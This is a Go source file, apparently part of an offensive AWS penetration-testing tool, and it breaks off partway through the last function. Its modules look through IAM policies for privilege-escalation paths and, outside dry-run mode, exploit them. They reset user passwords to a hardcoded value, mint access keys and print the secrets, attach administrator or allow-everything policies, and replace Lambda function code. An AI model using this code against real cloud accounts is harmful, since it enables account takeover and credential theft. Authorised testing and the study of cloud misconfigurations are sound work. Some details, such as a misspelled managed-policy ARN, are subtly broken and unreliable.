package module

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"net/url"
	"os"
	"regexp"
	"strings"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/iam"
	"github.com/aws/aws-sdk-go-v2/service/iam/types"
	"github.com/aws/aws-sdk-go-v2/service/lambda"
)

/*
Holds modules for aws commands best classified as 'enumeration' modules
*/

type (
	IAMUpdateLoginProfile struct {
		Mod
	}

	IAMCreateLoginProfile struct {
		Mod
	}

	IAMCreateAccessKey struct {
		Mod
	}

	IAMCreatePolicyVersion struct {
		Mod
	}

	IAMSetDefaultPolicyVersion struct {
		Mod
	}

	IAMPassRole struct {
		Mod
	}

	IAMAttachUserPolicy struct {
		Mod
	}

	IAMAttachGroupPolicy struct {
		Mod
	}

	IAMAttachRolePolicy struct {
		Mod
	}

	IAMAddUserToGroup struct {
		Mod
	}

	IAMPutUserPolicy struct {
		Mod
	}

	IAMPutGroupPolicy struct {
		Mod
	}

	LambdaUpdateFunctionCode struct {
		Mod
	}

	funcData struct {
		policies []*Policy
		Role     string // Role attached to lambda function
		Arn      string // Lambda function name
		Handler  string // Name of handler for the target function
	}
)

// readFile reads from a file and returns the contents
func readFile(file string) ([]byte, error) {
	contents, err := os.ReadFile(file)
	if err != nil {
		return nil, err
	}
	return contents, nil
}

// PrintAlreadyExploited prints out to the user that an already exploited privesc
// method was found along with the policy name
func PrintAlreadyExploited(polName string) {
	fmt.Printf("[*] A policy has already been exploited and has the name %s\n", polName)
}

// SearchForPolicy searches through a list of aws.Types.AttachedPolicy structs
// and returns if a certain policy was found along with the policy's name and the target resource
func SearchForPolicy(client *iam.Client, attachedPols *[]types.AttachedPolicy, inlinePols []*InlinePolicy, search func(*Policy) (string, bool, bool)) (bool, string, string, error) {
	// Check attached policies
	for _, v := range *attachedPols {
		policy, err := getPolicy(client, v.PolicyArn)
		if err != nil {
			return false, "", "", err
		}
		if resource, vulnerable, alreadyExploited := search(policy); vulnerable {
			return true, *v.PolicyName, resource, nil
		} else if alreadyExploited {
			PrintAlreadyExploited(*v.PolicyName)
			return true, *v.PolicyName, resource, nil
		}
	}

	// check inline policies
	for _, v := range inlinePols {
		if resource, vulnerable, alreadyExploited := search(v.Policy); vulnerable {
			return true, v.Name, resource, nil
		} else if alreadyExploited {
			PrintAlreadyExploited(v.Name)
			return true, v.Name, resource, nil
		}
	}
	return false, "", "", nil
}

// getPolicy retreives an iam.GetPolicyVersionOutput object, parses the object's policy document and unmarhsals
// the object to a module.Policy struct which is returned
func getPolicy(client *iam.Client, arn *string) (*Policy, error) {
	pol, err := client.GetPolicy(context.TODO(), &iam.GetPolicyInput{PolicyArn: arn})
	if err != nil {
		return nil, err
	}
	ver, err := client.GetPolicyVersion(context.TODO(), &iam.GetPolicyVersionInput{PolicyArn: arn, VersionId: pol.Policy.DefaultVersionId})
	if err != nil {
		return nil, err
	}
	decoded, err := url.QueryUnescape(*ver.PolicyVersion.Document)
	if err != nil {
		return nil, err
	}
	var policy *Policy
	err = json.Unmarshal([]byte(decoded), &policy)
	if err != nil {
		return nil, err
	}
	return policy, nil
}

func (obj *IAMUpdateLoginProfile) Run(dry bool, manager *DbManager, args ...string) (string, error) {
	// args should be length of one for the password that a user wants to set a user's login password to.
	// if a password is not received, set the password to Pa$$w0rd123!
	var ret string
	client := iam.NewFromConfig(*obj.Config)

	userEnum, err := EnumUser(&obj.Mod, manager)
	if err != nil {
		return "", err
	}

	found, policyName, resource, err := SearchForPolicy(client, userEnum.AttachedPolicies, userEnum.InlinePolicies, obj.search())
	if err != nil {
		return "", err
	}

	if found {
		// grab the user
		user := strings.Split(resource, "/")
		if len(user) <= 1 {
			return "", fmt.Errorf("error occurred when retrieving username of user for vulnerable "+
				"UpdateLoginProfile privesc method. Policy name is %s", policyName)
		}

		if dry {
			ret = fmt.Sprintf("UpdateLoginProfile privesc method found. Policy name is %s and affected user is %s", policyName, user)
		} else {
			pwd := "Pa$$w0rd123!"
			if len(args) > 0 {
				pwd = args[0]
			}
			_, err := client.UpdateLoginProfile(context.TODO(), &iam.UpdateLoginProfileInput{
				UserName:              aws.String(user[1]),
				Password:              aws.String(pwd),
				PasswordResetRequired: aws.Bool(false),
			})
			if err != nil {
				return "", err
			} else {
				ret = fmt.Sprintf("UpdateLoginProfile privesc method found and exploited. "+
					"Policy name is %s and %s's password is now %s", policyName, user[1], pwd)
			}
		}
	}
	return ret, nil
}

func (obj *IAMUpdateLoginProfile) search() func(pol *Policy) (string, bool, bool) {
	r, _ := regexp.Compile("arn:aws:iam::.*:user/.*")
	return func(pol *Policy) (string, bool, bool) {
		for _, s := range pol.Statement {
			// check if a Statement's Action value is a list and iterate through entries
			if k, ok := s.Action.([]interface{}); ok {
				for _, j := range k {
					if s.Effect == "Allow" && j == "iam:UpdateLoginProfile" && r.MatchString(s.Resource) {
						return s.Resource, true, false
					}
				}
			} else {
				// safe to assume Action value is a string
				if s.Effect == "Allow" && s.Action == "iam:UpdateLoginProfile" && r.MatchString(s.Resource) {
					return s.Resource, true, false
				}
			}
		}
		return "", false, false
	}
}

func (obj *IAMCreateLoginProfile) Run(dry bool, manager *DbManager, args ...string) (string, error) {
	// args should be length of one for the password that a user wants to set a user's login password to.
	// if a password is not received, set the password to Pa$$w0rd123!
	var ret string
	client := iam.NewFromConfig(*obj.Config)

	userEnum, err := EnumUser(&obj.Mod, manager)
	if err != nil {
		return "", err
	}

	found, policyName, resource, err := SearchForPolicy(client, userEnum.AttachedPolicies, userEnum.InlinePolicies, obj.search())
	if err != nil {
		return "", err
	}

	if found {
		// grab the user
		user := strings.Split(resource, "/")
		if len(user) <= 1 {
			return "", fmt.Errorf("error occurred when retrieving username of user for vulnerable "+
				"CreateLoginProfile privesc method. Policy name is %s", policyName)
		}

		if dry {
			ret = fmt.Sprintf("CreateLoginProfile privesc method found. Policy name is %s and affected user is %s", policyName, user)
		} else {
			pwd := "Pa$$w0rd123!"
			if len(args) > 0 {
				pwd = args[0]
			}
			_, err := client.CreateLoginProfile(context.TODO(), &iam.CreateLoginProfileInput{
				UserName:              aws.String(user[1]),
				Password:              aws.String(pwd),
				PasswordResetRequired: false,
			})
			if err != nil {
				return "", err
			} else {
				ret = fmt.Sprintf("CreateLoginProfile privesc method found and exploited. "+
					"Policy name is %s and %s's password is now %s", policyName, user[1], pwd)
			}
		}
	}
	return ret, nil
}

func (obj *IAMCreateLoginProfile) search() func(pol *Policy) (string, bool, bool) {
	r, _ := regexp.Compile("arn:aws:iam::.*:user/.") // use a '.' for the arn's account-id and the user account name
	return func(pol *Policy) (string, bool, bool) {
		for _, s := range pol.Statement {
			if actions, ok := s.Action.([]interface{}); ok {
				// iterate over actions and see if iam:CreateLoginProfile is one of them
				for _, i := range actions {
					if j, ok := i.(string); ok {
						if s.Effect == "Allow" && j == "iam:CreateLoginProfile" && r.MatchString(s.Resource) {
							return s.Resource, true, false
						}
					}
				}
			} else if s.Effect == "Allow" && s.Action == "iam:CreateLoginProfile" && r.MatchString(s.Resource) {
				return s.Resource, true, false
			}
		}
		return "", false, false
	}
}

func (obj *IAMCreateAccessKey) Run(dry bool, manager *DbManager, args ...string) (string, error) {
	// args should be of length 1. args[0] should be the user to create an access key for
	var ret string
	client := iam.NewFromConfig(*obj.Config)

	userEnum, err := EnumUser(&obj.Mod, manager)
	if err != nil {
		return "", err
	}

	found, policyName, _, err := SearchForPolicy(client, userEnum.AttachedPolicies, userEnum.InlinePolicies, obj.search())
	if err != nil {
		return "", err
	}

	if found {
		if dry {
			ret = fmt.Sprintf("CreateAccessKey privesc method found. Policy name is %s", policyName)
		} else {
			if len(args) == 0 {
				return "", errors.New("createAccessKey privesc method found but no user argument was passed " +
					"for the user to create an access key for")
			}
			output, err := client.CreateAccessKey(context.TODO(), &iam.CreateAccessKeyInput{
				UserName: aws.String(args[0]),
			})
			if err != nil {
				return "", err
			} else {
				ret = fmt.Sprintf("CreateAccessKey privesc method found and exploited. Policy name is %s. "+
					"%s Access key info: AccessKeyId: %s , SecretAccessKey: %s", policyName, args[0],
					*output.AccessKey.AccessKeyId, *output.AccessKey.SecretAccessKey)
			}
		}
	}
	return ret, nil
}

func (obj *IAMCreateAccessKey) search() func(pol *Policy) (string, bool, bool) {
	return func(pol *Policy) (string, bool, bool) {
		for _, s := range pol.Statement {
			if actions, ok := s.Action.([]interface{}); ok {
				// iterate over actions and see if iam:CreateAccessKey is one of them
				for _, i := range actions {
					if j, ok := i.(string); ok {
						if s.Effect == "Allow" && j == "iam:CreateAccessKey" && s.Resource == "*" {
							return s.Resource, true, false
						}
					}
				}
			} else if s.Effect == "Allow" && s.Action == "iam:CreateAccessKey" && s.Resource == "*" {
				return s.Resource, true, false
			}
		}
		return "", false, false
	}
}

// getPolicyArnByName searches through an array of AttachedPolicies and returns
// an ARN if the name of the policy matches that of an AttachedPolicy
func getPolicyArnByName(name string, policies []types.AttachedPolicy) (string, error) {
	for _, v := range policies {
		if name == *v.PolicyName {
			return name, nil
		}
	}
	return "", errors.New("could not find matching policy")
}

func (obj *IAMCreatePolicyVersion) Run(dry bool, manager *DbManager, args ...string) (string, error) {
	var ret string
	client := iam.NewFromConfig(*obj.Config)
	userEnum, err := EnumUser(&obj.Mod, manager)
	if err != nil {
		return "", err
	}

	found, policyName, _, err := SearchForPolicy(client, userEnum.AttachedPolicies, userEnum.InlinePolicies, obj.search())
	if err != nil {
		return "", err
	}

	if found {
		if dry {
			ret = fmt.Sprintf("CreatePolicyVersion privesc method found. Policy name is %s", policyName)
		} else {
			doc := `
			{
				"Version": "2012-10-17",
				"Statement": [
					{
						"Sid": "AllowEverything",
						"Effect": "Allow",
						"Action": "*",
						"Resource": "*"
					}
				 ]
			  }			
			`
			arn, err := getPolicyArnByName(policyName, *userEnum.AttachedPolicies)
			if err != nil {
				return "", fmt.Errorf("CreatePolicyVersion privesc method found but the "+
					"arn could not be resolved. Policy name is %s", policyName)
			}

			_, err = client.CreatePolicyVersion(context.TODO(), &iam.CreatePolicyVersionInput{
				PolicyArn:      aws.String(arn),
				PolicyDocument: aws.String(doc),
				SetAsDefault:   true,
			})

			if err != nil {
				return "", err
			} else {
				ret = fmt.Sprintf("CreatePolicyVersion privesc method found and exploited. "+
					"Policy name is %s and was the new default version is\n %s", policyName, doc)
			}
		}
	}
	return ret, nil
}

func (obj *IAMCreatePolicyVersion) search() func(pol *Policy) (string, bool, bool) {
	r, _ := regexp.Compile("arn:aws:iam::.:policy/*") // use a '.' for the arn's account-id
	return func(pol *Policy) (string, bool, bool) {
		for _, s := range pol.Statement {
			if actions, ok := s.Action.([]interface{}); ok {
				for _, i := range actions {
					if j, ok := i.(string); ok {
						// Check if iam:CreatePolicyVersion has already been exploited
						if s.Effect == "Allow" && j == "*" && s.Resource == "*" {
							return s.Resource, false, true
						}
						if s.Effect == "Allow" && j == "*" && r.MatchString(s.Resource) {
							return s.Resource, true, false
						}
					}
				}
			} else {
				if s.Effect == "Allow" && s.Action == "iam:CreatePolicyVersion" && r.MatchString(s.Resource) {
					return s.Resource, false, true
				}
				if s.Effect == "Deny" && s.NotAction == "iam:CreatePolicyVersion" && s.Resource == "*" {
					return s.Resource, true, false
				}
			}
		}
		return "", false, false
	}
}

func (obj *IAMSetDefaultPolicyVersion) Run(dry bool, manager *DbManager, args ...string) (string, error) {
	// Setting a default policy version involves enumerating all versions of potentionally all policies
	// and seeing which policy(s) has a vulnerable version. That seems a tad "involved" so we'll merely
	// check for the presence of SetDefaultPolicyVersion on all resources
	var ret string
	client := iam.NewFromConfig(*obj.Config)
	userEnum, err := EnumUser(&obj.Mod, manager)
	if err != nil {
		return "", err
	}

	found, policyName, _, err := SearchForPolicy(client, userEnum.AttachedPolicies, userEnum.InlinePolicies, obj.search())
	if err != nil {
		return "", err
	}

	if found {
		ret = fmt.Sprintf("SetDefaultPolicy privesc method found. Policy name is %s. Manually "+
			"check for policies that may have vulnerable versions.", policyName)
	}

	return ret, nil
}

func (obj *IAMSetDefaultPolicyVersion) search() func(pol *Policy) (string, bool, bool) {
	r, _ := regexp.Compile("arn:aws:iam::.:policy/*") // use a '.' for the arn's account-id
	return func(pol *Policy) (string, bool, bool) {
		for _, s := range pol.Statement {
			if actions, ok := s.Action.([]interface{}); ok {
				// iterate over actions and see if iam:SetDefaultPolicyVersion is one of them
				for _, i := range actions {
					if j, ok := i.(string); ok {
						if s.Effect == "Allow" && j == "iam:SetDefaultPolicyVersion" && r.MatchString(s.Resource) {
							return s.Resource, false, true
						}
						if s.Effect == "Deny" && j == "iam:SetDefaultPolicyVersion" && s.Resource == "*" {
							return s.Resource, true, false
						}
					}
				}
			} else {
				if s.Effect == "Allow" && s.Action == "iam:SetDefaultPolicyVersion" && r.MatchString(s.Resource) {
					return s.Resource, false, true
				}
				if s.Effect == "Deny" && s.NotAction == "iam:SetDefaultPolicyVersion" && s.Resource == "*" {
					return s.Resource, true, false
				}
			}
		}
		return "", false, false
	}
}

func (obj *IAMPassRole) Run(dry bool, manager *DbManager, args ...string) (string, error) {
	// IAMPassRole allows a user to pass a role to another AWS resource
	// In conjuction with ec2:Runinstances, this allows a user to create/run EC2 instances.
	// From there, a user can create an EC2 instance that they can pass a role to, which they
	// currently don't have, log in, and request AWS keys for the role
	var ret string
	client := iam.NewFromConfig(*obj.Config)
	userEnum, err := EnumUser(&obj.Mod, manager)
	if err != nil {
		return "", err
	}

	found, policyName, _, err := SearchForPolicy(client, userEnum.AttachedPolicies, userEnum.InlinePolicies, obj.search())
	if err != nil {
		return "", err
	}

	if found {
		ret = fmt.Sprintf("iam:PassRole privesc method found. Policy name is %s. For info on "+
			"exploitation steps, view item #3 at "+
			"https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/ and "+
			"https://bishopfox.com/blog/privilege-escalation-in-aws\n", policyName)
	}

	return ret, nil
}

func (obj *IAMPassRole) search() func(pol *Policy) (string, bool, bool) {
	return func(pol *Policy) (string, bool, bool) {
		count := 0
		for _, s := range pol.Statement {
			var required = map[string]bool{"iam:PassRole": false, "ec2:DescribeInstances": false, "ec2:RunInstances": false}
			// check if a Statement's Action value is a list and iterate through entries
			if actions, ok := s.Action.([]interface{}); ok {
				if len(actions) < 3 {
					// we know that the three needed actions aren't present. Get out
					return "", false, false
				} else {
					// iterate over actions and check that the 3 required actions are present
					for _, i := range actions {
						j, ok := i.(string)
						if !ok {
							continue // if not a string, move on
						}
						if k, ok := required[j]; ok {
							if !k {
								required[j] = true
								count++
							}
						}
						if count == 3 {
							break
						}
					}
					if count == 3 && s.Effect == "Allow" && s.Resource == "*" {
						return s.Resource, true, false
					}
				}
			}
		}
		return "", false, false
	}
}

func (obj *IAMAttachUserPolicy) Run(dry bool, manager *DbManager, args ...string) (string, error) {
	var ret string
	client := iam.NewFromConfig(*obj.Config)
	userEnum, err := EnumUser(&obj.Mod, manager)
	if err != nil {
		return "", err
	}

	found, policyName, _, err := SearchForPolicy(client, userEnum.AttachedPolicies, userEnum.InlinePolicies, obj.search())
	if err != nil {
		return "", err
	}

	if found {
		if dry {
			ret = fmt.Sprintf("AttachUserPolicy privesc method found. Policy name is %s", policyName)
		} else {
			if len(args) == 0 {
				return "", errors.New("attachUserPolicy privesc method found but no user argument was passed " +
					"for the user to add a policy to")
			}
			_, err := client.AttachUserPolicy(context.TODO(), &iam.AttachUserPolicyInput{
				UserName:  aws.String(args[0]),
				PolicyArn: aws.String("arn:aws:iam::aws:policy/AdministratorAcces"),
			})
			if err != nil {
				return "", err
			} else {
				ret = fmt.Sprintf("AttachUserPolicy privesc method found and exploited. Policy name is %s. "+
					"AWS managed AdministratorAccess policy applied to %s", policyName, args[0])
			}
		}
	}
	return ret, nil
}

func (obj *IAMAttachUserPolicy) search() func(pol *Policy) (string, bool, bool) {
	return func(pol *Policy) (string, bool, bool) {
		for _, s := range pol.Statement {
			if actions, ok := s.Action.([]interface{}); ok {
				for _, i := range actions {
					if j, ok := i.(string); ok {
						if s.Effect == "Allow" && j == "iam:AttachUserPolicy" && s.Resource == "*" {
							return s.Resource, true, false
						}
					}
				}
			} else {
				if s.Effect == "Allow" && s.Action == "iam:AttachUserPolicy" && s.Resource == "*" {
					return s.Resource, true, false
				}
			}
		}
		return "", false, false
	}
}

func (obj *IAMAttachGroupPolicy) Run(dry bool, manager *DbManager, args ...string) (string, error) {
	var ret string
	client := iam.NewFromConfig(*obj.Config)
	userEnum, err := EnumUser(&obj.Mod, manager)
	if err != nil {
		return "", err
	}

	found, policyName, _, err := SearchForPolicy(client, userEnum.AttachedPolicies, userEnum.InlinePolicies, obj.search())
	if err != nil {
		return "", err
	}

	if found {
		if dry {
			ret = fmt.Sprintf("AttachGroupPolicy privesc method found. Policy name is %s", policyName)
		} else {
			if len(args) == 0 {
				return "", errors.New("attachGroupPolicy privesc method found but no group argument was passed " +
					"for the user to add a policy to")
			}
			_, err := client.AttachGroupPolicy(context.TODO(), &iam.AttachGroupPolicyInput{
				GroupName: aws.String(args[0]),
				PolicyArn: aws.String("arn:aws:iam::aws:policy/AdministratorAcces"),
			})
			if err != nil {
				return "", err
			} else {
				ret = fmt.Sprintf("AttachGroupPolicy privesc method found and exploited. Policy name is %s. "+
					"AWS managed AdministratorAccess policy applied to %s", policyName, args[0])
			}
		}
	}
	return ret, nil
}

func (obj *IAMAttachGroupPolicy) search() func(pol *Policy) (string, bool, bool) {
	return func(pol *Policy) (string, bool, bool) {
		for _, s := range pol.Statement {
			if actions, ok := s.Action.([]interface{}); ok {
				for _, i := range actions {
					if j, ok := i.(string); ok {
						if s.Effect == "Allow" && j == "iam:AttachGroupPolicy" && s.Resource == "arn:aws:iam::*:group/*" {
							return s.Resource, true, false
						}
					}
				}
			} else {
				if s.Effect == "Allow" && s.Action == "iam:AttachGroupPolicy" && s.Resource == "arn:aws:iam::*:group/*" {
					return s.Resource, true, false
				}
			}
		}
		return "", false, false
	}
}

func (obj *IAMAddUserToGroup) Run(dry bool, manager *DbManager, args ...string) (string, error) {
	var ret string
	client := iam.NewFromConfig(*obj.Config)
	userEnum, err := EnumUser(&obj.Mod, manager)
	if err != nil {
		return "", err
	}

	found, policyName, _, err := SearchForPolicy(client, userEnum.AttachedPolicies, userEnum.InlinePolicies, obj.search())
	if err != nil {
		return "", err
	}

	if found {
		if dry {
			ret = fmt.Sprintf("AddUserToGroup privesc method found. Policy name is %s", policyName)
		} else {
			if len(args) == 0 {
				return "", errors.New("addUserToGroup privesc method found but no group argument was passed " +
					"for the user to add themself to")
			}
			_, err := client.AddUserToGroup(context.TODO(), &iam.AddUserToGroupInput{
				GroupName: aws.String(args[0]),
				UserName:  aws.String(obj.User),
			})
			if err != nil {
				return "", err
			} else {
				ret = fmt.Sprintf("AddUserToGroup privesc method found and exploited. Policy name is %s. "+
					"%s successfully added to %s", policyName, obj.User, args[0])
			}
		}
	}
	return ret, nil
}

func (obj *IAMAddUserToGroup) search() func(pol *Policy) (string, bool, bool) {
	return func(pol *Policy) (string, bool, bool) {
		for _, s := range pol.Statement {
			if actions, ok := s.Action.([]interface{}); ok {
				for _, i := range actions {
					if j, ok := i.(string); ok {
						if s.Effect == "Allow" && j == "iam:AddUserToGroup" && s.Resource == "arn:aws:iam::*:group/*" {
							return s.Resource, true, false
						}
					}
				}
			} else {
				if s.Effect == "Allow" && s.Action == "iam:AddUserToGroup" && s.Resource == "arn:aws:iam::*:group/*" {
					return s.Resource, true, false
				}
			}
		}
		return "", false, false
	}
}

func (obj *IAMPutUserPolicy) Run(dry bool, manager *DbManager, args ...string) (string, error) {
	// Adds or updates an inline policy document that is embedded in the specified IAM user.
	var ret string
	client := iam.NewFromConfig(*obj.Config)
	userEnum, err := EnumUser(&obj.Mod, manager)
	if err != nil {
		return "", err
	}

	found, policyName, resource, err := SearchForPolicy(client, userEnum.AttachedPolicies, userEnum.InlinePolicies, obj.search())
	if err != nil {
		return "", err
	}

	if found {
		user := strings.Split(resource, "/")
		if len(user) < 2 && resource != "*" {
			return "", fmt.Errorf("error occurred when retrieving username of user for vulnerable "+
				"PutUserPolicy privesc method. Policy name is %s and resource is %s", policyName, resource)
		}
		if dry {
			ret = fmt.Sprintf("PutUserPolicy privesc method found. Policy name is %s and resource is %s",
				policyName, resource)
		} else {
			if len(args) == 0 {
				return "", errors.New("putUserPolicy privesc method found but no user argument was passed " +
					"for the user to add an inline policy to")
			}
			// if we don't have a wildcard as the user resource, make sure the user we can use PutUserPolicy
			// on is the same as the user supplied
			var targetUser string
			if resource == "*" {
				targetUser = args[0]
			} else if user[1] != "*" {
				if !strings.EqualFold(user[1], args[0]) {
					return "", fmt.Errorf("putUserPolicy privesc method found and applicable to the user %s. "+
						"User supplied to module was %s. Forgoing exploitation", user[1], args[0])
				} else {
					targetUser = args[0]
				}
			}
			doc := `
			{
				"Version": "2012-10-17",
				"Statement": [
					{
						"Effect": "Allow",
						"Action": "*",
						"Resource": "*"
					}
				 ]
			  }			
			`
			_, err := client.PutUserPolicy(context.TODO(), &iam.PutUserPolicyInput{
				PolicyDocument: aws.String(doc),
				PolicyName:     aws.String("inline_user_policy_test"),
				UserName:       aws.String(targetUser),
			})
			if err != nil {
				return "", err
			} else {
				ret = fmt.Sprintf("PutUserPolicy privesc method found and exploited. Policy name is %s. "+
					"The following policy was applied to %s:\n %s", policyName, targetUser, doc)
			}
		}
	}
	return ret, nil
}

func (obj *IAMPutUserPolicy) search() func(pol *Policy) (string, bool, bool) {
	r, _ := regexp.Compile("arn:aws:iam::*:user/.")
	return func(pol *Policy) (string, bool, bool) {
		for _, s := range pol.Statement {
			if actions, ok := s.Action.([]interface{}); ok {
				for _, i := range actions {
					if j, ok := i.(string); ok {
						if s.Effect == "Allow" && j == "iam:PutUserPolicy" &&
							(r.MatchString(s.Resource) || s.Resource == "*") {
							return s.Resource, true, false
						}
					}
				}
			} else {
				if s.Effect == "Allow" && s.Action == "iam:PutUserPolicy" &&
					(r.MatchString(s.Resource) || s.Resource == "*") {
					return s.Resource, true, false
				}
			}
		}
		return "", false, false
	}
}

func (obj *IAMAttachRolePolicy) Run(dry bool, manager *DbManager, args ...string) (string, error) {
	var ret string
	client := iam.NewFromConfig(*obj.Config)
	userEnum, err := EnumUser(&obj.Mod, manager)
	if err != nil {
		return "", err
	}

	found, policyName, resource, err := SearchForPolicy(client, userEnum.AttachedPolicies, userEnum.InlinePolicies, obj.search())
	if err != nil {
		return "", err
	}

	if found {
		role := strings.Split(resource, "/")
		if len(role) < 2 {
			return "", fmt.Errorf("error occurred when retrieving role for vulnerable "+
				"AttachRolePolicy privesc method. Policy name is %s and resource is %s", policyName, role)
		}
		if dry {
			ret = fmt.Sprintf("AttachRolePolicy privesc method found. Policy name is %s and resource is %s.",
				policyName, resource)
		} else {
			if len(args) == 0 {
				return "", errors.New("attachRolePolicy privesc method found but no role argument was passed " +
					"to add a policy to")
			}
			if role[1] != "*" {
				if !strings.EqualFold(role[1], args[0]) {
					return "", fmt.Errorf("putUserPolicy privesc method found and applicable to the user %s. "+
						"User supplied to module was %s. Forgoing exploitation", role[1], args[0])
				}
			}
			_, err := client.AttachRolePolicy(context.TODO(), &iam.AttachRolePolicyInput{
				RoleName:  aws.String(args[0]),
				PolicyArn: aws.String("arn:aws:iam::aws:policy/AdministratorAcces"),
			})
			if err != nil {
				return "", err
			} else {
				ret = fmt.Sprintf("AttachRolePolicy privesc method found and exploited. Policy name is %s. "+
					"AWS managed AdministratorAccess policy applied to %s", policyName, args[0])
			}
		}
	}
	return ret, nil
}

func (obj *IAMAttachRolePolicy) search() func(pol *Policy) (string, bool, bool) {
	return func(pol *Policy) (string, bool, bool) {
		for _, s := range pol.Statement {
			if actions, ok := s.Action.([]interface{}); ok {
				for _, i := range actions {
					if j, ok := i.(string); ok {
						if s.Effect == "Allow" && j == "iam:AttachRolePolicy" && s.Resource == "arn:aws:iam::*:role/*" {
							return s.Resource, true, false
						}
					}
				}
			} else {
				if s.Effect == "Allow" && s.Action == "iam:AttachRolePolicy" && s.Resource == "arn:aws:iam::*:role/*" {
					return s.Resource, true, false
				}
			}
		}
		return "", false, false
	}
}

func (obj *IAMPutGroupPolicy) Run(dry bool, manager *DbManager, args ...string) (string, error) {
	// Adds or updates an inline policy document that is embedded in the specified IAM group.
	var ret string
	client := iam.NewFromConfig(*obj.Config)
	userEnum, err := EnumUser(&obj.Mod, manager)
	if err != nil {
		return "", err
	}

	found, policyName, resource, err := SearchForPolicy(client, userEnum.AttachedPolicies, userEnum.InlinePolicies, obj.search())
	if err != nil {
		return "", err
	}

	if found {
		group := strings.Split(resource, "/")
		if len(group) < 2 && resource != "*" {
			return "", fmt.Errorf("error occurred when retrieving groupname of group for vulnerable "+
				"PutGroupPolicy privesc method. Policy name is %s and resource is %s", policyName, resource)
		}
		if dry {
			ret = fmt.Sprintf("PutGroupPolicy privesc method found. Policy name is %s and resource is %s",
				policyName, resource)
		} else {
			if len(args) == 0 {
				return "", errors.New("putGroupPolicy privesc method found but no group argument was passed " +
					"for the user to add an inline policy to")
			}
			// if we don't have a wildcard as the group resource, make sure the group we can use PutGroupPolicy
			// on is the same as the user supplied
			var targetGroup string
			if resource == "*" {
				targetGroup = args[0]
			} else if group[1] != "*" {
				if !strings.EqualFold(group[1], args[0]) {
					return "", fmt.Errorf("putGroupPolicy privesc method found and applicable to the group %s. "+
						"Group supplied to module was %s. Forgoing exploitation", group[1], args[0])
				} else {
					targetGroup = args[0]
				}
			}
			doc := `
			{
				"Version": "2012-10-17",
				"Statement": [
					{
						"Effect": "Allow",
						"Action": "*",
						"Resource": "*"
					}
				 ]
			  }			
			`
			_, err := client.PutGroupPolicy(context.TODO(), &iam.PutGroupPolicyInput{
				PolicyDocument: aws.String(doc),
				PolicyName:     aws.String("inline_group_policy_test"),
				GroupName:      aws.String(targetGroup),
			})
			if err != nil {
				return "", err
			} else {
				ret = fmt.Sprintf("PutGroupPolicy privesc method found and exploited. Policy name is %s. "+
					"The following policy was applied to %s:\n %s", policyName, targetGroup, doc)
			}
		}
	}
	return ret, nil
}

func (obj *IAMPutGroupPolicy) search() func(pol *Policy) (string, bool, bool) {
	r, _ := regexp.Compile("arn:aws:iam::*:group/.")
	return func(pol *Policy) (string, bool, bool) {
		for _, s := range pol.Statement {
			if actions, ok := s.Action.([]interface{}); ok {
				for _, i := range actions {
					if j, ok := i.(string); ok {
						if s.Effect == "Allow" && j == "iam:PutGroupPolicy" &&
							(r.MatchString(s.Resource) || s.Resource == "*") {
							return s.Resource, true, false
						}
					}
				}
			} else {
				if s.Effect == "Allow" && s.Action == "iam:PutGroupPolicy" &&
					(r.MatchString(s.Resource) || s.Resource == "*") {
					return s.Resource, true, false
				}
			}
		}
		return "", false, false
	}
}

// populateLambdaFuncs checks if the the Lambda functions associated with an AWS user have already been
// retrieved. If not, query Lambda for all functions
func populateLambdaFuncs(client *iam.Client, user string, conf aws.Config, manager *DbManager) error {
	funcs, err := manager.GetLambdaFuncs(user)
	if err != nil {
		return err
	}
	if funcs == nil {
		if err = setLambdaFuncs(client, user, conf, manager); err != nil {
			return err
		}
	}
	return nil
}

// setLambdaFuncs enumerates lambda functions and calls DbManager.AddLambdaFuncs
func setLambdaFuncs(client *iam.Client, user string, conf aws.Config, manager *DbManager) error {
	lambdaFuncs, err := EnumLambdaFuncs(GetLambdaClient(conf))
	if err != nil {
		return err
	}
	err = manager.AddLambdaFuncs(user, sortFuntionsByRoles(client, lambdaFuncs))
	if err != nil {
		return err
	}
	return nil
}

func (obj *LambdaUpdateFunctionCode) Run(dry bool, manager *DbManager, args ...string) (string, error) {
	// AWS accounts containing an existing Lambda function and the lambda:UpdateFunctionCode permission
	// can modify the code of an existing lambda function so that it escalates their privileges when invoked

	/*
		In this function, look if the user that has a policy with the action lambda:UpdateFunctionCode
		if found, go and find all lambda functions and all policies attached with each lambda function
		if there are policies other than something like AWSLambdaBasicExecutionRole (so basic stuff),
		query all of those policies (keep track of what has been queried so we don't query it again)
		and write those policies out to a db (file for now) or something so the user can choose what they want.
		Exploiting phase would consist of taking a specific function with a specific policy attached and overwriting the code
		so that the code abuses the attached policy
	*/

	var ret string
	client := iam.NewFromConfig(*obj.Config)
	userEnum, err := EnumUser(&obj.Mod, manager)
	if err != nil {
		return "", err
	}

	found, policyName, resource, err := SearchForPolicy(client, userEnum.AttachedPolicies, userEnum.InlinePolicies, obj.search())
	if err != nil {
		return "", err
	}

	if found {
		if dry {
			ret = fmt.Sprintf("Potential UpdateFunctionCode privesc method found. Policy name is %s and resource is %s",
				policyName, resource)
		} else {
			/*
				find all lambda functions and all policies assoicated with each lambda function
				the first arg is the function name to abuse
				the second arg is a path to the code a user has for updating a lambda function's code
				TODO implement outputting the functions and policies to the DB instead of a text file
			*/

			if err = populateLambdaFuncs(client, obj.User, *obj.Config, manager); err != nil {
				return "", err
			} else {
				fmt.Println("[*] lambda functions successfully written to database")
			}

			if len(args) < 2 {
				return "", errors.New("potential UpdateFunctionCode privesc method found but not enough arguments were passed. " +
					"The first argument should be the function name to abuse and the second argument is a path to a zip file " +
					"containing the code to be used during the UpdateFunctionCode call")
			}

			funcName := args[0]
			file := args[1]

			contents, err := readFile(file)
			if err != nil {
				return "", err
			}

			lambdaClient := GetLambdaClient(*obj.Config)

			_, err = lambdaClient.UpdateFunctionCode(context.TODO(), &lambda.UpdateFunctionCodeInput{
				FunctionName: aws.String(funcName),
				ZipFile:      contents,
			})
			if err != nil {
				return "", err
			} else {
				ret = "UpdateFunctionCode privesc method found and exploited."
			}
		}
	}
	return ret, nil
}

func (obj *LambdaUpdateFunctionCode) search() func(pol *Policy) (string, bool, bool) {
	r, _ := regexp.Compile("arn:aws:lambda:.*:.*:function:.*")
	return func(pol *Policy) (string, bool, bool) {
